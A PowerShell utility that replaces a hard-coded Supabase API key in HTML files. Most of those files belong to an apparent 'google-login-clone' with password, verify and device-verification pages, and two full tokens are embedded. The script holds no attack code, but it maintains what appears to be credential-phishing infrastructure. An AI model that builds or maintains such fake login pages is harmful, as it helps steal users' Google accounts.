Write-Host "🔧 FIXING ALL HTML API KEYS..." -ForegroundColor Cyan
Write-Host ""

$oldKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc"
$newKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im90YnN3dGtscGlkaGV6emlvdGFjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwOTIyNTEsImV4cCI6MjA2NjY2ODI1MX0.cxOLFAy1UlAwu_Ho_B9hA1PMfvc7Wg3DnIwrRUalzck"

$files = @(
    "test-supabase.html",
    "google-login-clone/index.html",
    "google-login-clone/password.html", 
    "google-login-clone/verify.html",
    "google-login-clone/verify-device.html",
    "google-login-clone/verify-notification.html"
)

foreach ($file in $files) {
    if (Test-Path $file) {
        Write-Host "✅ Updating $file..." -ForegroundColor Green
        $content = Get-Content $file -Raw
        $content = $content -replace [regex]::Escape($oldKey), $newKey
        Set-Content $file -Value $content -NoNewline
    } else {
        Write-Host "❌ File not found: $file" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "🎉 ALL HTML API KEYS UPDATED!" -ForegroundColor Green
Write-Host "📋 From: nqsdardermkzppeaazbb (OLD)" -ForegroundColor Yellow
Write-Host "📋 To: otbswtklpidhezziotac (NEW)" -ForegroundColor Yellow
Write-Host ""
Write-Host "🚀 Ready to test! Frontend should work now." -ForegroundColor Cyan

# Verify the changes
Write-Host ""
Write-Host "🔍 Verifying changes..." -ForegroundColor Cyan
$oldKeyFound = $false
foreach ($file in $files) {
    if (Test-Path $file) {
        $content = Get-Content $file -Raw
        if ($content -match [regex]::Escape($oldKey)) {
            Write-Host "⚠️  Old key still found in: $file" -ForegroundColor Red
            $oldKeyFound = $true
        }
    }
}

if (-not $oldKeyFound) {
    Write-Host "✅ Verification complete - No old keys found!" -ForegroundColor Green
} else {
    Write-Host "❌ Some files still contain old keys" -ForegroundColor Red
}

Write-Host ""
Write-Host "Press any key to continue..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") 